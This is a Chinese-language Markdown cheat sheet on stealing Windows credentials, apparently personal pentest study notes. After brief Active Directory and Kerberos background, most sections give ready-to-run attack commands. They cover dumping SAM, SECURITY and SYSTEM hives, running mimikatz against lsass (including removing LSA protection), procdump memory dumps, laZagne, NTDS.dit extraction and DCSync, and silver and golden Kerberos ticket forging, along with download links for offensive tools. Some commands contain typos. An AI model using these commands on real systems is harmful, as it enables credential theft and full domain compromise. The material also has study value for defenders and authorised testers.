# Windows凭证



## 基础知识



### AD(Active Directory，活动目录)

活动目录(AD)以树状的数据结构来组成网络服务的信息，在简单的网络环境中（例如小公司），通常网域都只有一个，在中型或大型的网络中，网域可能会有很多个，或是和其他公司或组织的AD相互链接

![](https://raw.githubusercontent.com/Explorersss/photo/master/20201009215930.png)

### Kerbroes(地狱三头犬)



![](https://raw.githubusercontent.com/Explorersss/photo/master/20201009220224.png)

![image-20201009220751234](C:\Users\11267\AppData\Roaming\Typora\typora-user-images\image-20201009220751234.png)

#### KDC/DC(Key Distribution Center)

##### AS(Authentication Service)

为client生成TGT的服务

##### TGS(Ticket Granting Service)

为client生成某个服务的ticket

#### AD(Account Database)

存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT

### 域认证流程

![](https://raw.githubusercontent.com/Explorersss/photo/master/20201009222147.png)





![image-20201011142151698](https://raw.githubusercontent.com/Explorersss/photo/master/20201011142151.png)



![image-20201011142247651](https://raw.githubusercontent.com/Explorersss/photo/master/20201011142247.png)



![image-20201011142332901](https://raw.githubusercontent.com/Explorersss/photo/master/20201011142333.png)



![image-20201011142650639](https://raw.githubusercontent.com/Explorersss/photo/master/20201011142650.png)



![image-20201011142832621](https://raw.githubusercontent.com/Explorersss/photo/master/20201011142832.png)















## 获取明文身份凭证

### LSA Secrets

> LSA secrets is a special protected storage for important data used by the **Local Security Authority** (LSA) in Windows. LSA is designed for managing a system's local security policy, auditing, authenticating, logging users on to the system, storing private data. Users' and system's sensitive data is stored in secrets. Access to all secret data is available to system only. However, as shown below, some programs, in particular [Windows Password Recovery](https://www.passcape.com/windows_password_recovery), allow to override this restriction.



LSA Secrets存储在注册表的 HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets中



自Windows 8.1 开始为LSA提供了额外的保护（LSA Protection），以防止读取内存和不受保护的进程注入代码。保护模式要求所有加载到LSA的插件都必须使用Microsoft签名进行数字签名。





#### 获取明文密码

1. 导出HKEY_LOCAL_MACHINE\SAM,HKEY_LOCAL_MACHINE\SECURITY,HKEY_LOCAL_MACHINE\SYSTEM

   ```
   reg.exe save hklm\sam c:\sam.save
   reg.exe save hklm\security c:\security.save
   reg.exe save hklm\system c:\system.save
   ```

2. 利用Impacket中的secretsdump导出密码,将3个文件放到Impacket\examples

   ```
   secretsdump.py -sam sam.save -security security.save -system system.save
   ```

   

### LSASS Process

lsass(Local Security Authority Subsystem Service, 本地安全性授权服务)是一个系统进程，用于微软Windows系统的安全机制。它用于本地安全和登陆策略

为了支持WDigest 和SSP身份认证，LSASS使用明文存储用户身份凭证，如果UseLogonCredential的值设置为0，则内存中不会存放明文密码

#### 使用mimikatz

`mimikatz "sekurlsa::logonPasswords" "full" "exit"`

#### 使用procdump

使用procdump转储lsass进程

`procdump.exe -accepteula -ma lsass.exe c:lsass.dmp 2>&1`

使用mimikatz从转储文件提取密码

```
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords
```



#### LSASS Protection Bypass

LSASS Protection开启方式：

可以通过注册表开启LSA Protection，注册表位置：
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
新建-DWORD（32）值，名称为 RunAsPPL,数值为 00000001，然后重启系统生效。

```
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # sekurlsa::logonPasswords
```

### Credential Manager

#### 简介


Credential Manager，中文翻译为凭据管理器，用来存储凭据(例如网站登录和主机远程连接的用户名密码)

如果用户选择存储凭据，那么当用户再次使用对应的操作，系统会自动填入凭据，实现自动登录

凭据保存在特定的位置，被称作为保管库(vault)(位于`%localappdata%/Microsoft\Vault`)

#### 凭据类别

包含两种，分别为`Domain Credentials`和`Generic Credentials`

##### Domain Credentials：

只有本地Local Security Authority (LSA)能够对其读写

也就是说，普通权限无法读取Domain Credentials类型的明文口令

##### Generic Credentials：

能够被用户进程读写

也就是说，普通权限可以读取Generic Credentials类型的明文口令

#### 导出

利用mimikatz直接获取

```
Mimikatz> privilege::debug
Mimikatz> sekurlsa::credman
```

### 用户文件中获取身份凭证

#### 工具

laZagne

`laZagne all -quiet -oN`

## 获取Hash身份凭证

### 通过SAM数据库获取本地用户Hash凭证

什么是SAM

>The **Security Account Manager** (**SAM**) is a database file[[1\]](https://en.wikipedia.org/wiki/Security_Account_Manager#cite_note-1) in Windows XP, Windows Vista, Windows 7, 8.1 and 10 that stores users' passwords. It can be used to authenticate local and remote users. Beginning with Windows 2000 SP4, Active Directory authenticates remote users. SAM uses cryptographic measures to prevent unauthenticated users accessing the system.
>
>The user passwords are stored in a hashed format in a [registry hive](https://en.wikipedia.org/wiki/Windows_Registry#Hives) either as a LM hash or as a NTLM hash. This file can be found in `%SystemRoot%/system32/config/SAM` and is mounted on `HKLM/SAM`.
>
>In an attempt to improve the security of the SAM database against offline software cracking, Microsoft introduced the SYSKEY function in Windows NT 4.0. When SYSKEY is enabled, the on-disk copy of the SAM file is partially encrypted, so that the password hash values for all local accounts stored in the SAM are encrypted with a key (usually also referred to as the "SYSKEY"). It can be enabled by running the `syskey` program



#### 直接获取NTLM hash

1. Mimikatz

```
Mimikatz> privilege::debug
Mimikatz> token::elevate
Mimikatz> lsadump::sam
```



2.pwdump7

```
http://passwords.openwall.net/b/pwdump/pwdump7.zip
```



3.Invoke-PowerDump.ps1

```
https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1
```



#### 导出SAM数据库

##### 导出

1. 直接利用reg.exe

```
reg save HKLM\sam sam
reg save HKLM\system system
```

2. Invoke-NinjaCopy.ps1

```
https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1
Invoke-NinjaCopy -Path "C:\Windows\System32\config\SYSTEM" -LocalDestination "C:\system.save"
Invoke-NinjaCopy -Path "C:\Windows\System32\config\SAM" -LocalDestination "C:\SAM.save"

```



##### 从SAM数据库中导出hash

导出hash

```
lsadump::sam /sam:SAM.save /system:SYSTEM.save
```



### 通过域控制器的NTDS.dit文件

Ntds.dit是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中所有用户的密码哈希值。为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。

#### 远程提取

用impacket中的secretsdump.py脚本

`secretsdump.py -just-dc administrator:password@192.168.1.101`



#### 本地提取

https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1

利用Copy-VSS将ntds.dit拷贝到本地

使用impacket中的secretsdump.py解密

`python secretsdump.py -ntds ntds.dit -system /system.hiv LOCAL`



或者使用mimikatz

`lsadump::dcsync /domian:lzly.lab /all /csv`





#### 获取NTDS.dit文章

https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E8%8E%B7%E5%BE%97%E5%9F%9F%E6%8E%A7%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTDS.dit%E6%96%87%E4%BB%B6/



## PTT

### 白银票据（Silver Ticket）



#### 默认服务

![image-20201011143914853](https://raw.githubusercontent.com/Explorersss/photo/master/20201011143914.png)





#### 原理

![image-20201011143020800](https://raw.githubusercontent.com/Explorersss/photo/master/20201011143020.png)





#### 利用

```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > pass.txt#导出票据
mimikate "kerberos::golden /domain:<域名> /sid:<域SID> /target:<目标服务器主机名> /service:<服务类型> /rc4:<NTLM Hash> /user:<用户名> /ptt" exit # 伪造票据

```





#### 防御

![image-20201011144015509](https://raw.githubusercontent.com/Explorersss/photo/master/20201011144015.png)



### 黄金票据（GoldenTickets）

![image-20201011144205810](https://raw.githubusercontent.com/Explorersss/photo/master/20201011144205.png)

#### 利用

msfwiki

![image-20201011144256618](https://raw.githubusercontent.com/Explorersss/photo/master/20201011144256.png)





```
#msfwiki
load kiwi
golden_ticket_create -d payloads.online -k <ker> -s <SSID> -u <USER> -t /path/to/save#创建票据
kerberos_ticket_use /tmp/krbtgt.ticket# 注入票据
kerberos_ticket_list # 列出票据


```



mimikatz:

```
mimikatz "kerberos::golden /domain:<域名> /sid ... /rc4 ... /user ... /ptt"
mimikatz log "lsadump::dcsync /domain:scanf.com /user:krbtgt"
```



## Windows Access Token

![image-20201011154101696](https://raw.githubusercontent.com/Explorersss/photo/master/20201011154101.png)

![image-20201011154205413](https://raw.githubusercontent.com/Explorersss/photo/master/20201011154205.png)

![image-20201011154317801](https://raw.githubusercontent.com/Explorersss/photo/master/20201011154317.png)

![image-20201011154325811](https://raw.githubusercontent.com/Explorersss/photo/master/20201011154325.png)



![image-20201011154404049](https://raw.githubusercontent.com/Explorersss/photo/master/20201011154404.png)





## 教程

https://www.bilibili.com/video/BV1S4411q7Cw

